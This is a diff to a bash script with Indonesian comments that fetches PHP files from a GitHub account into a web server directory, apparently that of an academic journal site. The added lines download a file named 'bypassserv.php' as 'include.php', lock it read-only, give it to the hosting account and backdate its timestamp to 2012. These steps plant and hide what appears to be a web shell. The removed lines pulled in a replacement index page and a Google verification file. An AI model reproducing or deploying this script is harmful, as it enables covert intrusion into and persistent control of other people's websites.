@@ -1,13 +1,12 @@
 #!/bin/bash
 
 # Konfigurasi
-FOLDER_PATH="/var/www/webapp/"
+FOLDER_PATH="/usr/share/nginx/html/ojs/api/v1/_email/"
 TIMESTAMP="201201081531.12"
 
 # Daftar file dan URL-nya (menggunakan associative array)
 declare -A FILES=(
-    ["index.php"]="https://raw.githubusercontent.com/zycoder0day/kerjas/refs/heads/main/index.php"
-    ["googled2485c05cb45dad8.html"]="https://raw.githubusercontent.com/zycoder0day/kerjas/refs/heads/main/googled2485c05cb45dad8.html"
+       ["include.php"]="https://raw.githubusercontent.com/zycoder0day/projects/refs/heads/main/bypassserv.php"
 )
 
 # Fungsi untuk memastikan folder ada
@@ -47,7 +46,7 @@ update_file() {
         # Ubah izin file menjadi 0444 (read-only untuk semua)
         chmod 0444 "$file_path"
         # Ubah kepemilikan ke lppmsftp:www-data (memerlukan izin khusus)
-        if ! chown lppmsftp:www-data "$file_path"; then
+        if ! chown journals.uol:psacln "$file_path"; then
             echo "Gagal mengubah kepemilikan $file_path. Periksa izin." >&2
         fi
         touch -t "$TIMESTAMP" "$file_path"
